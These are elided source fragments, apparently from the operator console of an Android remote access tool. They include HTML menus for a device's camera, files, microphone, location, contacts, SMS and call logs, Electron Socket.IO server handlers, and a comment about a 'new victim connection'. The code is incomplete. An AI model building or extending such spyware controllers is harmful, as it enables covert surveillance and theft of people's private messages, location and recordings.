        ...
        <div class="row h15 notDraggable bg">
            <div class="sixteen wide border bg column">
                <div class="ui mini borderless bg labeled icon fluid seven item menu">
                    <a class="item" ng-click="goToPage('camera'); clearLogs()">
                        <i class="red photo icon"></i> Camera
                    </a>
                    <a class="item" ng-click="goToPage('fileManager'); clearLogs()">
                        <i class=" teal folder icon "></i> File Manager
                    </a>
                    <a class="item" ng-click="goToPage('mic'); clearLogs()">
                        <i class="blue unmute icon "></i> Mic
                    </a>
                    <a class="item " ng-click="goToPage('location'); clearLogs()">
                        <i class="violet marker icon "></i> Location
                    </a>
                    <a class="item " ng-click="goToPage('contacts'); clearLogs()">
                        <i class="purple users icon "></i> contacts
                    </a>
                    <a class="item " ng-click="goToPage('smsManager'); clearLogs()">
                        <i class="grey talk outline icon "></i> SMS
                    </a>
                    <a class="item " ng-click="goToPage('callsLogs'); clearLogs()">
...
<div class="ui top attached tabular menu">
    ...
    <a class="item" data-tab="smsLists" ng-click="activateDefaultSmsListTab(); getInboxSMSList()">SMS Lists</a>
</div>
...
<div class="ui bottom attached tab segment h90" data-tab="smsLists">
    <div class="ui top attached tabular menu">
        <a class="item" data-tab="inboxSMSList" ng-click="getInboxSMSList()">Inbox List</a>
...
ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    ...
    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectMessage', port);
    } else {
...
app.controller('AppCtrl', ($scope) => {
    ...
    ipcRenderer.on('SocketIO:ServerDisconnectMessage', (event, port) => {
        $appCtrl.Log('[¡] Server Disconnected from Client', CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    // open the lab when a new victim connection is established
...
app.controller("SMSCtrl", function ($scope, $rootScope) {
    ...
    $SMSCtrl.activateDefaultSmsListTab = () => {
